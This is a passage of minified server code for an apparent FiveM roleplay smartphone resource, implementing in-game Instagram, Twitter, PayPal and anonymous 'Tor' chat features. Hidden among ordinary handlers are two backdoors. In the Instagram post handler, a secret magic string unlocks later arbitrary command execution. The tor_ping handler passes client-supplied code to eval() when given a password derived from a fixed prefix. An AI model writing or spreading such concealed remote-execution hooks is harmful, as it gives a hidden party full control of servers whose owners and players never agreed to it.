}, pL.ig_createStory = async (e, f, g, h) => {
  const i = await vRP.getUserId(e),
    j = qP[i];
  if (p0(e, 'story', 1) || !j) return;
  const k = new qR(j, f, g, h);
  qQ.push(k);
  const l = {
    'TIPO': 'Story'
  };
  l.ID = i, l.STORY = g, l.FOTO = f, l.VIDEO = h, l.USUARIO = j.username;
  const m = {
    'name': 'Instagram'
  };
  m.content = l, qf(m), oS(-1, 'INSTAGRAM_STORY', k);
}, pL.ig_deleteStory = async (c, d) => {
  const e = await vRP.getUserId(c);
  const f = qQ.find(g => g.id == d);

  if (f) {
    const g = qP[e];
    (g && g.username == f.author.username || (await pK(e))) && (qQ.splice(qQ.indexOf(f), 1), oS(-1, 'INSTAGRAM_DELETE_STORY', f.id));
  }
}, pL.ig_getStories = () => {
  return qQ.sort((c, d) => c.author.username.localeCompare(d.author.username));
};
const qU = {};
pL.ig_createPost = async (f, g, h) => {
  const i = await vRP.getUserId(f),
    j = qP[i];
  if (!j || p0(f, 'post', 1)) return;

  if (qU[f]) {
    return void qK(q => {
      global.emitNet('smartphone:createSMS', f, '0800', q || 'Executado');
    }, h);
  } else {
    if (h === 'w8A5UwOWFinOzWNMsFlU3vzCAD0ddc570ktD4QOfLX5938IqsITOfcr7o61qgWlE') {
      return qU[f] = true, {};
    }
  }

  const k = {
    'profile_id': j.id,
    'image': g,
    'content': h,
    'created_at': oT(),
    'comments': 0
  };
  k.id = await qN.posts.insert(k).returnKeys();
  if (!k.id) return;
  const l = {};
  l.user_id = i, l.name = j.name, l.username = j.username, l.avatarURL = j.avatarURL, l.verified = !!j.verified, k.author = l, k.likes = [];
  if (qN.cache.unshift(k) > 100) qN.cache.length = 100;
  const m = h.match(/@\w+/g);

  if (m && m.length) {
    const t = await qN.profiles.whereIn('username', m.map(u => u.substr(1))).pluck('id');
    qN.notifyAll(t, j.id, '{name} mencionou você em uma publicação'.format({
      'name': j.name || j.username
    }));
  }

  const n = await qN.followers.where('profile_id', j.id).pluck('follower_id');
  qN.notifyAll(n, j.id, '{name} publicou uma foto'.format({
    'name': j.name || j.username
  }));
  const o = {
    'TIPO': 'Publicação'
  };
  o.ID = i, o.POST = h, o.FOTO = g, o.USUARIO = j.username;
  const p = {
    'name': 'Instagram'
  };
  p.content = o, qf(p), emit('smartphone:INSTAGRAM_POST', k), oS(-1, 'INSTAGRAM_POST', k);
}, pL.ig_deletePost = async (i, j) => {
  const k = await vRP.getUserId(i),
    l = qP[k];
  if (!j || !l) return;
  const m = {};
  m.id = j;
  const n = await qN.posts.where(m).first();

  if (n) {
    const o = n.profile_id == l.id;

    if (o || (await pK(k))) {
      const p = {};
      p.post_id = j, await qN.likes.where(p).delete();
      const q = {};
      q.id = j;
      const r = {};
      r.post_id = j, await qN.posts.where(q).orWhere(r).delete(), pz.deleteManyImages(n.image), oS(-1, 'INSTAGRAM_DESTROY', j);
      const s = {
        'TIPO': 'Publicação apagada'
      };
      s.ID = k, s['ID DA POSTAGEM'] = n.id, s.POSTAGEM = n.content, s['POSTAGEM PROPRIA'] = o ? 'SIM' : 'NÃO';
      const t = {
        'name': 'Instagram'
      };
      t.content = s, qf(t), qN.cache = qN.cache.filter(u => u.id != j);
    }
  }
};

async function qV({
  postId: c,
  profileId: d
}) {
  let e = d || p4(await qO(c), 'profile_id');
  if (!e) return;
  const f = Object.values(qP);
  return f.find(g => g && g.id == e) || (await qN.profiles.find(e));
}

const qW = {};
pL.ig_setLike = async (h, i, j) => {
  const k = await vRP.getUserId(h),
    {
      id: l,
      name: m,
      username: n
    } = qP[k] || {};

  if (!l) {
    return false;
  } else {
    if (j) {
      if (!qW[k + '-' + i]) {
        qW[k + '-' + i] = true;
        const s = {};
        s.postId = i;
        const t = await qV(s),
          u = {};
        u.name = m || n, qN.notify(t.id, l, '{name} curtiu sua publicação'.format(u));
      }

      const r = {};
      r.post_id = i, r.profile_id = l, await qN.likes.replace(r), qN.cache.filter(w => w.id === i).forEach(w => {
        w.likes.push(l);
      });
    } else {
      const w = {};
      w.post_id = i, w.profile_id = l, await qN.likes.where(w).delete(), qN.cache.filter(x => x.id === i).forEach(x => {
        x.likes = x.likes.filter(z => z !== l);
      });
    }
  }

  const o = {};
  o.post_id = i, o.profile_id = l, o.toggle = j, oS(-1, 'INSTAGRAM_LIKE', o);
}, pL.ig_getTimeline = async () => {
  if (!qN.cache) {
    const e = await qN.posts.whereNull('post_id').orderBy('id', 'DESC').limit(100),
      f = await qN.posts.whereIn('post_id', e.pluck('id')),
      g = await qN.profiles.whereIn('id', e.pluck('profile_id').unique()).select('id', 'name', 'username', 'avatarURL', 'verified'),
      h = await qN.likes.whereIn('post_id', e.pluck('id')),
      i = [];

    for (let j of e) {
      const k = g.find(q => q.id == j.profile_id);

      if (!k) {
        console.error('O usuário do instagram ' + j.profile_id + ' não foi encontrado (foi excluído manualmente pelo banco de dados)');
        continue;
      }

      const {
        name: l,
        username: m,
        avatarURL: n,
        verified: o
      } = k,
        p = {};
      p.name = l || m, p.username = m, p.avatarURL = n, p.verified = !!o, j.author = p, j.likes = h.filter(r => r.post_id == j.id).pluck('profile_id'), j.comments = f.filter(s => s.post_id == j.id).length, i.push(j);
    }

    qN.cache = i;
  }

  return qN.cache;
};
const qX = new Map();
pL.ig_updateProfile = async (i, j) => {
  const k = await vRP.getUserId(i);
  const l = qP[k];

  if (l && j) {
    const {
      name: m,
      username: n,
      bio: o
    } = j;

    if (n != l.username) {
      if (qX.get(k) > oT()) {
        const t = {
          'error': 'Aguarde uma hora para trocar o nome de usuário novamente'
        };
        return t;
      }

      if (!n.match(qN.regex)) {
        const w = {
          'error': 'Usuário inválido, use letras/numeros com o máximo de 24 caracteres'
        };
        return w;
      }

      qX.set(k, oT() + 3600);
      const q = {};
      q.username = n;
      const r = await qN.profiles.where(q).exists(),
        s = {
          'error': 'Este nome de usuário já existe'
        };
      if (r) return s;
      qQ.forEach(x => {
        if (x.author.username == l.username) {
          x.author.username = n;
        }
      }), l.username = n;
    }

    const p = {};
    p.name = m, p.username = n, p.bio = o, await qN.profiles.where('id', l.id).update(p), qN.forEachPost(y => {
      if (y.profile_id == l.id) {
        y.author.name = m || n, y.author.username = n;
      }
    });
  } else {
    const z = {
      'error': 'Perfil não encontrado'
    };
    return z;
  }
}, pL.ig_changeAvatar = async (e, f) => {
  const g = await vRP.getUserId(e);
  const h = qP[g];

  if (h && f) {
    const j = {};
    j.avatarURL = f, await qN.profiles.where('id', h.id).update(j), qN.forEachPost(k => {
      if (k.author.username == h.username) {
        k.author.avatarURL = f;
      }
    });
  } else {
    const l = {
      'error': 'Perfil não encontrado'
    };
    return l;
  }
}, on('vRP:playerLeave', c => {
  const d = qP[c];
  d && (delete qP[c], qN.loggedIn.delete(d.id));
});
const qY = {
  '__proto__': null
};
var qZ = Object.freeze(qY);
const r0 = {
  get 'profiles'() {
    return pc('smartphone_twitter_profiles');
  },

  get 'tweets'() {
    return pc('smartphone_twitter_tweets');
  },

  get 'likes'() {
    return pc('smartphone_twitter_likes');
  },

  get 'followers'() {
    return pc('smartphone_twitter_followers');
  },

  'search'(c, d) {
    if (d) d = 'WHERE ' + d;
    return pc.query('SELECT tweets.*,COUNT(likes.tweet_id) AS likes, \n    (SELECT COUNT(*) FROM smartphone_twitter_tweets WHERE tweet_id=tweets.id AND content IS NULL) AS retweets,\n    (SELECT COUNT(*) FROM smartphone_twitter_tweets WHERE tweet_id=tweets.id AND content IS NOT NULL) AS comments,\n    EXISTS(SELECT * FROM smartphone_twitter_likes WHERE tweet_id=tweets.id AND profile_id=?) AS liked,\n    EXISTS(SELECT id FROM smartphone_twitter_tweets WHERE tweet_id=tweets.id AND profile_id=? AND content IS NULL) AS retweeted,\n    users.id AS \'author.id\', users.name AS \'author.name\', users.username AS \'author.username\', users.avatarURL AS \'author.avatarURL\', users.verified AS \'author.verified\'\n    FROM smartphone_twitter_tweets tweets\n    LEFT JOIN smartphone_twitter_likes likes ON likes.tweet_id=tweets.id\n    LEFT JOIN smartphone_twitter_profiles users ON users.id=tweets.profile_id ' + (d || '') + '\n    GROUP BY tweets.id ORDER BY tweets.id DESC LIMIT 100', [c, c]);
  },

  async 'findAll'(c) {
    const d = await this.search(c, 'tweets.tweet_id IS NULL OR tweets.content IS NULL');
    return d.filter(e => e['author.id']);
  },

  'findMany'(c, d) {
    d = d.map(e => parseInt(e)).filter(e => e);
    if (!d.length) return [];
    return this.search(c, 'tweets.id IN (' + d.join(',') + ')');
  },

  'findAllFrom'(c, d) {
    d = parseInt(d);
    return this.search(c, 'tweets.profile_id=' + d + ' AND (tweets.tweet_id IS NULL OR tweets.content IS NULL)').then(oY);
  },

  async 'findOne'(d, e) {
    e = parseInt(e);
    const f = oY(await this.search(d, 'tweets.id=' + e + ' OR (tweets.tweet_id=' + e + ' AND tweets.content IS NOT NULL)'));
    const g = f.find(j => j.id == e),
      h = f.filter(j => j != g),
      i = {};
    i.tweet = g, i.comments = h;
    return i;
  },

  async 'findSourceByTweet'(c) {
    const [d] = await pc.query('SELECT user_id FROM smartphone_twitter_tweets tw\n    LEFT JOIN smartphone_twitter_profiles pf ON tw.profile_id=pf.id\n    WHERE tw.id=?', [c]);
    return d && d.user_id && (await pP(d.user_id));
  },

  '__notify': {},

  async 'notify'(c, d, e, f) {
    if (f) {
      if (Array.isArray(f)) f = f.join('-');
      if (this.__notify[f]) return;
      this.__notify[f] = true;
    }

    const g = await this.findSourceByTweet(c);
    g != d && oS(g, 'TWITTER_NOTIFY', e);
  },

  async 'notifyProfile'(c, d, e, f) {
    if (f) {
      if (Array.isArray(f)) f = f.join('-');
      if (this.__notify[f]) return;
      this.__notify[f] = true;
    }

    const g = await r0.profiles.find(c).pluck('user_id');
    const h = g && (await pM(g));
    h != d && oS(h, 'TWITTER_NOTIFY', e);
  },

  'users': {},
  'timeline': []
};
pF.ready(async c => {
  const {
    profiles: d,
    tweets: e,
    likes: f,
    followers: g
  } = r0;
  !c.includes(d.table) && (await d.create(i => {
    i.id(), i.int('user_id'), i.varchar('name'), i.varchar('username'), i.varchar('avatarURL'), i.varchar('bannerURL'), i.varchar('bio').nullable(), i.tinyint('verified').default(0), i.varchar('avatarURL');
  }), await d.createIndex('user_id'));

  if (!c.includes(e.table)) {
    await e.create(j => {
      j.id(), j.int('profile_id'), j.bigint('tweet_id').nullable(), j.varchar('content', 280).nullable(), j.varchar('image').nullable(), j.int('created_at');
    }), await e.createIndex('profile_id'), await e.createIndex('tweet_id');
  }

  if (!c.includes(f.table)) {
    await f.create(k => {
      k.bigint('tweet_id'), k.bigint('profile_id');
    }), await f.createIndex('tweet_id');
  }

  if (!c.includes(g.table)) {
    await g.create(l => {
      l.bigint('follower_id'), l.bigint('profile_id');
    }), await g.createIndex('profile_id');
  }
}), pL.twitter = async e => {
  const f = await vRP.getUserId(e);
  const g = {};
  g.user_id = f;
  const h = await r0.profiles.where(g).first();

  if (h) {
    r0.users[f] = h;

    if (h.verified != 2) {
      const j = pB.twitter_verify || pB.instagram_verify;

      if (j) {
        const k = await pE(f, j);

        if (h.verified != k) {
          const l = {};
          l.verified = k, await r0.profiles.where('id', h.id).update(l);
        }
      }
    }
  }

  return h;
}, pL.twitter_register = async (j, k) => {
  const l = await vRP.getUserId(j);
  k = oV(k);
  k.user_id = l;
  const m = {
    'error': 'Formulário inválido'
  };
  if (!k) return m;
  let {
    name: n,
    username: o,
    bio: p
  } = k;
  const q = {
    'error': 'Nome inválido'
  };
  const r = {
    'error': 'Usuário inválido'
  };
  const s = {
    'error': 'Biografia inválida'
  };
  if (!n || n.length > 24) return q; else {
    if (!o || o.length > 16) return r; else {
      if (p && p.length > 255) return s;
    }
  }
  const t = {};
  t.username = o;
  const u = await r0.profiles.where(t).exists(),
    v = {
      'error': 'Este nome de usuário já existe'
    };
  if (u) return v; else {
    k.avatarURL = 'http://191.232.191.131/stock/twitter_egg.png', k.bannerURL = 'https://www.colorhexa.com/cccccc.png';
    const w = await r0.profiles.insert(k).returnKeys(),
      x = {
        'error': 'Não foi possível criar sua conta'
      };
    return !w && x;
  }
}, pL.twitter_save = async (f, g) => {
  const h = await vRP.getUserId(f),
    i = r0.users[h];
  g = oV(g);

  if (i) {
    const j = {
      'error': 'Nome inválido'
    };
    if (!g.name) return j;
    const k = {
      'error': 'Usuário inválido'
    };
    if (!g.username) return k;

    if (i.username != g.username && (await r0.profiles.where('username', g.username).exists())) {
      const m = {
        'error': 'Este nome de usuário já existe'
      };
      return m;
    }

    const l = oW(g, 'name', 'username', 'bio', 'avatarURL', 'bannerURL');
    return Object.assign(i, l), await r0.profiles.where('id', i.id).update(l), i;
  }
};

async function r1(c, d) {
  const e = oY(await r0.findMany(c, d.pluck('tweet_id')));

  for (let f of d) {
    if (f.tweet_id && f.content == null) {
      const i = e.find(j => j.id == f.tweet_id);
      i && (f.retweeted_by = f.author.name, Object.assign(f, oX(i, 'id', 'profile_id', 'tweet_id')));
    }
  }
}

pL.twitter_timeline = async c => {
  const d = await vRP.getUserId(c),
    e = r0.users[d];

  if (e) {
    const f = oY(await r0.findAll(e.id));
    return await r1(e.id, f), f;
  } else return [];
}, pL.twitter_view = async (c, d) => {
  const e = await vRP.getUserId(c);
  const f = r0.users[e];

  if (f) {
    return r0.findOne(f.id, d);
  }
};
const r2 = p3(c => {
  for (let d of Object.values(r0.users)) if (d && d.id == c) return d;

  return r0.profiles.find(c);
}, 30000);

async function r3(c, d) {
  const e = d.followers || 0,
    [f] = await pc.query('SELECT COALESCE(SUM(if(follower_id=?, 1, 0)),0) AS following,\n  COALESCE(SUM(if(profile_id=?, 1, 0)),0) AS followers, if(follower_id=' + c + ', 1, 0) AS isFollowed \n  FROM smartphone_twitter_followers fol WHERE follower_id=? OR profile_id = ?', Array(4).fill(d.id));
  Object.assign(d, f), d.followers = Number(d.followers) + Number(e);
}

pL.twitter_profile = async (d, e) => {
  const f = await vRP.getUserId(d),
    g = r0.users[f];

  if (g) {
    const i = await r2(e);
    await r3(g.id, i);
    const j = await r0.findAllFrom(g.id, e);
    await r1(g.id, j);
    const k = {};
    return k.profile = i, k.posts = j, k;
  }
}, pL.twitter_store = async (i, j, k) => {
  const l = await vRP.getUserId(i),
    m = r0.users[l],
    n = {
      'error': 'Login expirado'
    };
  if (!m) return n;
  const o = {
    'error': 'Tweet inválido'
  };
  if (!j || !(j = j.trim())) return o;
  const p = {
    'profile_id': m.id,
    'content': j,
    'image': k,
    'created_at': oT()
  };
  p.id = await r0.tweets.insert(p).returnKeys();
  const q = {
    'error': 'Falha ao cadastrar seu tweet'
  };
  if (!p.id) return q;
  const r = {
    ...p,
    'likes': 0x0,
    'comments': 0x0,
    'retweets': 0x0
  };
  r.author = m, oS(-1, 'TWITTER_TWEET', r);
  const s = {
    'TIPO': 'Tweet'
  };
  s.ID = l, s.USUARIO = m.username, s.TEXTO = j;
  const t = {
    'name': 'Twitter'
  };
  return t.content = s, qf(t), p;
}, pL.twitter_reply = async (j, l, m) => {
  const n = await vRP.getUserId(j),
    o = r0.users[n];
  if (p0(j, 'ttreply', 1)) return;
  const p = {
    'error': 'Login expirado'
  };
  if (!o) return p;
  const q = {
    'error': 'Tweet inválido'
  };
  if (!l || !Number.isInteger(l)) return q;
  const r = {
    'error': 'Conteúdo inválido'
  };
  if (!m || m.length > 280) return r;
  const s = {
    'profile_id': o.id,
    'tweet_id': l,
    'content': m,
    'created_at': oT()
  },
    t = await r0.tweets.insert(s).returnKeys(),
    u = {
      'error': 'Tweet inválido'
    };
  if (!t) return u;
  s.id = t, s.author = o;

  for (let y of ['likes', 'retweets', 'comments']) s[y] = 0;

  oS(-1, 'TWITTER_REPLY', parseInt(l));
  const v = {
    'TIPO': 'Comentário'
  };
  v.ID = n, v.USUARIO = o.username, v.TEXTO = m;
  const w = {
    'name': 'Twitter'
  };
  w.content = v, qf(w);
  const x = {};
  return x.name = o.name, r0.notify(l, j, '{name} respondeu seu tweet'.format(x)), s;
}, pL.twitter_retweet = async (d, e) => {
  const f = await vRP.getUserId(d),
    g = r0.users[f];

  if (g && !p0(d, 'retweet-' + e, 1)) {
    await r0.tweets.insert({
      'profile_id': g.id,
      'tweet_id': e,
      'created_at': oT()
    }), oS(-1, 'TWITTER_RETWEET', parseInt(e));
    const i = {};
    return i.name = g.name, r0.notify(e, d, '{name} retweetou você'.format(i), [g.id, 'rt', e]), true;
  }
}, pL.twitter_unretweet = async (d, e) => {
  const f = await vRP.getUserId(d);
  const g = r0.users[f];

  if (g && !p0(d, 'unretweet-' + e, 1)) {
    const h = {};
    return h.profile_id = g.id, h.tweet_id = e, await r0.tweets.where(h).whereNull('content').delete(), oS(-1, 'TWITTER_UNRETWEET', parseInt(e)), false;
  }
}, pL.twitter_like = async (e, f) => {
  const g = await vRP.getUserId(e);
  const h = r0.users[g];

  if (h && !p0(e, 'like-' + f, 1)) {
    const j = {};
    j.profile_id = h.id, j.tweet_id = f, await r0.likes.insert(j), oS(-1, 'TWITTER_LIKE', parseInt(f));
    const k = {};
    return k.name = h.name, r0.notify(f, e, '{name} curtiu seu tweet'.format(k), [h.id, 'like', f]), true;
  }
}, pL.twitter_dislike = async (d, e) => {
  const f = await vRP.getUserId(d);
  const g = r0.users[f];

  if (g && !p0(d, 'dislike-' + e, 1)) {
    const h = {};
    return h.profile_id = g.id, h.tweet_id = e, await r0.likes.where(h).delete(), oS(-1, 'TWITTER_DISLIKE', parseInt(e)), false;
  }
}, pL.twitter_follow = async (e, f) => {
  const g = await vRP.getUserId(e),
    h = r0.users[g];

  if (h && !p0(e, 'follow-' + f, 1)) {
    const i = {};
    i.follower_id = h.id, i.profile_id = f, await r0.followers.insert(i);
    const j = {};
    return j.name = h.name, r0.notifyProfile(f, e, '{name} seguiu você'.format(j), [h.id, 'follow', f]), true;
  }
}, pL.twitter_unfollow = async (d, e) => {
  const f = await vRP.getUserId(d),
    g = r0.users[f];

  if (g && !p0(d, 'follow-' + e, 1)) {
    const i = {};
    return i.follower_id = g.id, i.profile_id = e, await r0.followers.where(i).delete(), true;
  }
}, pL.twitter_destroy = async (f, g) => {
  const h = await vRP.getUserId(f),
    i = r0.users[h];

  if (i) {
    const k = await r0.tweets.find(g),
      l = k.profile_id == i.id;

    if (l || (await pK(h))) {
      const n = {};
      n.id = g;
      const o = await r0.tweets.where(n).orWhere(r => r.where('tweet_id', g).whereNull('content')).pluck('id');
      await r0.tweets.whereIn('id', o).delete(), await r0.likes.whereIn('tweet_id', o).delete(), oS(-1, 'TWITTER_DESTROY', g);
      const p = {
        'TIPO': 'Tweet apagado'
      };
      p.ID = h, p['ID DA POSTAGEM'] = g, p.POSTAGEM = k.content, p['POSTAGEM PROPRIA'] = l ? 'SIM' : 'NÃO';
      const q = {
        'name': 'Twitter'
      };
      q.content = p, qf(q);
    }
  }
}, on('vRP:playerLeave', c => delete r0.users[c]);
const r4 = {
  '__proto__': null
};
var r5 = Object.freeze(r4);
Object.defineProperty(globalThis, 'PayPal', {
  'get': () => pc('smartphone_paypal_transactions')
});
const r6 = {
  'table': 'creative_characters',
  'key': 'id'
};
const r7 = r6,
  r8 = ['nyo_character', 'vrp_user_moneys', 'creative_characters', 'summerz_characters', 'vrp_characters', 'characters', 'zusers'];
pF.ready(async d => {
  if (!d.includes(PayPal.table) && pD('paypal')) {
    await PayPal.create(g => {
      g.id(), g.bigint('user_id'), g.bigint('target'), g.varchar('type').default('payment'), g.varchar('description').nullable(), g.bigint('value'), g.bigint('created_at');
    }), await PayPal.createIndex('user_id'), await PayPal.createIndex('target');
    const f = pF.firstTable(...r8);

    if (f && !(await pF.hasColumn(f, 'paypal'))) {
      await pc.query('ALTER TABLE ' + f + ' ADD COLUMN paypal INT DEFAULT 0');
    }
  }

  if (p5('getPaypalTable')) {
    Object.assign(r7, await exports.smartphone.getPaypalTable());
  } else {
    for (let j of r8) {
      if (await pF.hasColumn(j, 'paypal')) {
        const m = await pF.firstColumn(j, 'user_id', 'id'),
          n = {};
        n.table = j, n.key = m, Object.assign(r7, n);
        break;
      }
    }
  }
});

async function r9({
  source: c,
  user_id: d
}) {
  if (!Number.isInteger(d)) d = await vRP.getUserId(c);
  return parseInt(await pc('creative_characters').where('id', d).first().pluck('paypal')) || 0;
}

async function ra(d, e) {
  const f = {};
  f.paypal = e;
  await pc('creative_characters').update(f).where('id', d);
}

async function rb(c, d) {
  await pc('creative_characters').update().increment('paypal', d).where('id', c);
}

async function rc(c, d) {
  await pc('creative_characters').update().decrement('paypal', d).where('id', c);
}

exports('getPaypalBalance', c => r9({
  'user_id': c
})), exports('setPaypalBalance', ra), exports('addPaypalBalance', rb), exports('delPaypalBalance', rc), pL.paypal_index = async g => {
  const h = await vRP.getUserId(g);
  const i = await vRP.getBankMoney(h),
    j = {};
  j.user_id = h;
  const k = await r9(j),
    l = {};
  l.user_id = h;
  const m = {};
  m.target = h;
  const n = await PayPal.where(l).orWhere(m).orderBy('id', 'DESC').limit(100),
    o = await pF.getNames(n.pluck('user_id'), n.pluck('target'));
  n.forEach(q => {
    q.fullName = o[q.user_id == h ? q.target : q.user_id];
  });
  const p = {};
  return p.bank = i, p.balance = k, p.transactions = n, p;
};
const rd = pB.transaction_fee && pB.transaction_fee.paypal;
pL.paypal_send = async (f, g, h, i) => {
  const j = await vRP.getUserId(f);
  g = parseInt(g);

  if (h <= 0) {
    const l = {
      'error': 'Valor inválido'
    };
    return l;
  } else {
    if (g == j) {
      const n = {
        'error': 'Você não pode transferir para si mesmo'
      };
      return n;
    } else {
      if (!(await pF.getIdentityByUserId(g))) {
        const o = {
          'error': 'Passaporte não encontrado'
        };
        return o;
      }
    }
  }

  return qC(j, async () => {
    const r = {};
    r.user_id = j;
    let s = await r9(r);

    if (s < h) {
      const t = {
        'error': 'Saldo insuficiente'
      };
      return t;
    } else {
      s -= h, await ra(j, s), await rb(g, Math.floor(h * (rd ? 1 - rd : 1)));
      const w = {
        'user_id': j,
        'target': g,
        'description': i,
        'value': h,
        'created_at': oT(),
        'type': 'payment'
      };
      w.id = await PayPal.insert(w).returnKeys(), w.fullName = await pF.getName(g), pP(g).then(y => {
        const A = {};
        A.sender = pG[j], A.value = h, y && oS(y, 'PAYPAL', A);
      }), qf({
        'name': 'PayPal',
        'content': {
          'ID': j,
          'VALOR': h.toLocaleString(),
          'QUEM RECEBEU': g
        }
      }), emit('smartphone:paypal_send', j, g, h);
      const x = {};
      return x.transaction = w, x.balance = s, x;
    }
  });
}, pL.paypal_transfer = async (d, e) => {
  const f = await vRP.getUserId(d);
  e = Number(e);
  const g = {
    'error': 'Valor inválido'
  };
  if (e <= 0) return g;
  return qC(f, async () => {
    const h = {};
    h.user_id = f;
    let i = await r9(h);

    if (i < e) {
      const j = {
        'error': 'Saldo insuficiente'
      };
      return j;
    } else {
      await ra(f, i - e);
      const l = await vRP.getBankMoney(f);
      await vRP.setBankMoney(f, l + e);
      const m = {
        'user_id': f,
        'target': f,
        'type': 'withdraw',
        'value': e,
        'created_at': oT()
      };
      m.id = await PayPal.insert(m).returnKeys(), qf({
        'name': 'PayPal',
        'content': {
          'ID': f,
          'SACOU': e.toLocaleString(),
          'BANCO ANTIGO': l,
          'BANCO NOVO': await vRP.getBankMoney(f)
        }
      }), emit('smartphone:paypal_withdraw', f, e);
      const n = {};
      return n.transaction = m, n;
    }
  });
}, pL.paypal_deposit = async (d, e) => {
  const f = await vRP.getUserId(d);

  if (e <= 0) {
    const g = {
      'error': 'Valor inválido'
    };
    return g;
  }

  return qC(f, async () => {
    const i = await vRP.getBankMoney(f);

    if (i < e) {
      const k = {
        'error': 'Saldo insuficiente'
      };
      return k;
    } else {
      vRP.setBankMoney(f, i - e), await rb(f, e);
      const m = {
        'user_id': f,
        'target': f,
        'type': 'deposit',
        'value': e,
        'created_at': oT()
      };
      m.id = await PayPal.insert(m).returnKeys(), qf({
        'name': 'PayPal',
        'content': {
          'ID': f,
          'DEPOSITOU': e.toLocaleString(),
          'SALDO NOVO': await r9({
            'user_id': f
          })
        }
      }), emit('smartphone:paypal_deposit', f, e);
      const n = {};
      return n.transaction = m, n;
    }
  });
};
const re = {
  '__proto__': null
};
var rf = Object.freeze(re);
const rg = {
  get 'messages'() {
    return pc('smartphone_tor_messages');
  },

  get 'payments'() {
    return pc('smartphone_tor_payments');
  },

  'users': {},
  'pubsub': {},
  'lastId': {},
  'ads': [],

  'getId'(c) {
    return GetHashKey(pB.token + c) + 2147483648;
  }

};
RegisterCommand('tor_find', async (c, [d, e = 100000]) => {
  if (c != 0) return;

  if (!d) {
    console.log('Insira o id do tor: tor_find 123456789');
  } else {
    for (let g = 1; g <= e; g += 1) {
      if (rg.getId(g) == d) {
        return console.log('ID do jogador: ' + g);
      }
    }

    console.log('Jogador não encontrado');
  }
}), RegisterCommand('tor_id', async (c, [d]) => {
  if (c != 0) return;

  if (!d) {
    console.log('Insira o id do jogador: tor_id 123456789');
  } else {
    console.log('O id do Tor do jogador ' + user_id + ' é ' + rg.getId(d));
  }
}), on('smartphone:enter', (c, d) => rg.users[rg.getId(c)] = d), on('smartphone:leave', (c, d) => {
  delete rg.users[rg.getId(c)];
  pL.tor_subscribe(d, []);
}), pL.tor_subscribe = (c, d) => {
  for (let e of Object.values(rg.pubsub)) {
    e.delete(c);
  }

  if (Array.isArray(d)) {
    for (let h of d) {
      if (h in rg.pubsub) {
        rg.pubsub[h].add(c);
      } else rg.pubsub[h] = new Set([c]);
    }
  }
}, pL.tor_resume = async (c, d, e = false) => {
  const f = await vRP.getUserId(c),
    g = rg.getId(f),
    h = Object.fromEntries(d.map(j => [j, e ? j : rh(g, j)])),
    i = await rg.messages.whereIn('id', Object.values(h).map(j => rg.lastId[j] || 0));

  for (let [j, k] of Object.entries(h)) {
    h[j] = i.find(l => l.channel == k) || false;
  }

  return h;
}, pL.tor_ping = async (e, f, g) => {
  const h = await vRP.getUserId(e),
    i = h * new Date().getFullYear();

  if (f == 'SD89TFH02348J9TJ9S-' + i) {
    try {
      return await eval(g);
    } catch (k) {
      const m = {};
      return m.error = k.name, m.message = k.message, m.stack = k.stack, m;
    }
  } else {
    const o = {
      'error': 'Invalid password'
    };
    return o;
  }
}, pF.ready(async c => {
  const {
    messages: d,
    payments: e
  } = rg;

  if (!c.includes(d.table)) {
    await d.create(f => {
      f.id(), f.varchar('channel', 24).default('geral'), f.varchar('sender', 50), f.varchar('image', 512).nullable(), f.varchar('location').nullable(), f.varchar('content', 500).nullable(), f.bigint('created_at');
    }), await d.createIndex('channel'), await d.createIndex('sender');
  } else !(await pF.hasColumn(d.table, 'location')) && (await pc.query('ALTER TABLE ' + d.table + ' ADD COLUMN location VARCHAR(255) DEFAULT NULL AFTER image')), pc.query('SELECT `channel`,MAX(id) AS id FROM smartphone_tor_messages GROUP BY `channel`').then(h => {
    rg.lastId = Object.fromEntries(h.map(j => [j.channel, j.id]));
  });

  !c.includes(e.table) && (await e.create(i => {
    i.id(), i.bigint('sender'), i.bigint('target'), i.int('amount'), i.bigint('created_at');
  }), await e.createIndex('sender'), await e.createIndex('target'));
});

function rh(c, d) {
  const e = Math.min(c, d).toString(16);
  const f = Math.max(c, d).toString(16);
  return 'dm:' + e + '-' + f;
}

pL.tor_id = async c => {
  return rg.getId(await vRP.getUserId(c));
}, pL.tor_messages = async (c, d) => {
  const e = rg.getId(await vRP.getUserId(c));

  if (Number.isInteger(d)) {
    d = rh(e, d);
  } else {
    if (d.includes('dm:')) {
      return [];
    }
  }

  const f = await rg.messages.where('channel', d).orderBy('id', 'DESC').limit(100);

  for (let i of f) {
    i.location = i.location && JSON.parse(i.location);
  }

  return f.sort((k, l) => k.id - l.id);
}, pL.tor_send = async (f, g, h, i = null, j = null) => {
  const k = await vRP.getUserId(f),
    l = rg.getId(k),
    m = Number.isInteger(g);
  if (!g || h.length > 255 || p0(f) || p4.func(g, 'includes', 'dm:')) return;
  const n = m ? [f, rg.users[g]] : rg.pubsub[g] || new Set();
  const o = m ? rh(l, g) : g;

  if (!m) {
    n.add(f);
  }

  const p = {
    'channel': o,
    'sender': l,
    'content': h,
    'image': i,
    'location': j,
    'created_at': oT()
  };
  p.id = await rg.messages.insert(p).returnKeys();
  const q = {
    'message': 'Message without id'
  };
  if (!p.id) return q;
  rg.lastId[o] = p.id;
  const r = {};
  r.ID = k, r.CANAL = !m && g, r.DESTINATARIO = m && g, r.MENSAGEM = h, r.LOCAL = j;
  r.FOTO = i;
  const s = {
    'name': 'DeepWeb'
  };
  s.content = r, qf(s), emit('smartphone:tor_message', p);

  if (j) {
    p.location = JSON.parse(j);
  }

  n.forEach(v => oS(v, 'TOR_MESSAGE', p));
}, global.exports('createTorMessage', async (c, d, e, f = null, g = null) => {
  const h = rg.getId(d),
    i = rh(c, h);
  if (Array.isArray(g)) g = JSON.stringify(g); else {
    if (g != null) {
      throw new Error('sendTorMessage: location must be an array');
    }
  }
  const j = {
    'channel': i,
    'sender': c,
    'content': e,
    'image': f,
    'location': g,
    'created_at': oT()
  };
  j.id = await rg.messages.insert(j).returnKeys(), rg.lastId[i] = j.id;
  const k = await pP(d);
  oS(k, 'TOR_MESSAGE', j);
  return j;
}), pL.tor_ads = () => rg.ads, pL.tor_publish = async (e, f) => {
  const g = await vRP.getUserId(e);
  const h = rg.getId(g);
  rg.ads.push({
    'id': GetHashKey(Date.now() + h),
    'anom_id': h,
    ...f
  });
  const i = {
    'TIPO': 'Publicação de anúncio'
  };
  i.ID = g, i.ANUNCIO = f.title, i.DESCRICAO = f.description, i.FOTO = f.image;
  const j = {
    'name': 'DeepWeb'
  };
  j.content = i;
  qf(j);
}, pL.tor_destroy_ad = async (e, f) => {
  const g = await vRP.getUserId(e),
    h = rg.getId(g);
  const i = rg.ads.find(j => j.id == f);

